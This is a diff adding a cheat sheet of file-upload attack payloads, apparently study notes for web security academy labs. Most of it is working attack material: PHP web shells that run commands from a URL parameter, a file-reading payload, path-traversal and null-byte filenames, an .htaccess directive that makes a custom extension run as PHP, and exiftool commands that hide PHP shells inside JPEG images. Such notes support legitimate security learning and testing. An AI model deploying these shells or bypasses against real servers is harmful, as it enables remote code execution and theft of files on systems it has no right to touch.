@@ -1,0 +1,39 @@
+WEB-SHELL-PHP-1
+<?php
+echo 'Cmd: ' . system($_GET['cmd']) . ' ';
+?>
+
+WEB-SHELL-PHP-2
+<?php echo file_get_contents('/path/to/target/file'); ?>
+
+CHANGE-MIMIE-TYPE
+Content-Type to image/jpeg. 
+
+DIR-TRAVERSAL
+Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+
+DIR-TRAVERSAL-URL-ENCODE
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+..%2f
+
+BYPASS EXTENSION BLOCK
+In Burp Repeater, go to the tab for the POST /my-account/avatar request and find the part of the body that relates to your PHP file. Make the following changes:
+
+    Change the value of the filename parameter to .htaccess.
+    Change the value of the Content-Type header to text/plain.
+
+    Replace the contents of the file (your PHP payload) with the following Apache directive:
+    AddType application/x-httpd-php .l33t
+
+    This maps an arbitrary extension (.l33t) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already. 
+
+OBFUSCATE FILE EXTENSION
+filename="exploit.php%00.jpg"
+
+# RCE via polyglot
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+exiftool -Comment="<?php echo 'START ' .  system($_GET['cmd']) . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
+
+# ADDITIONAL RESOURCES
+https://security-tips.vincd.com/file-upload/
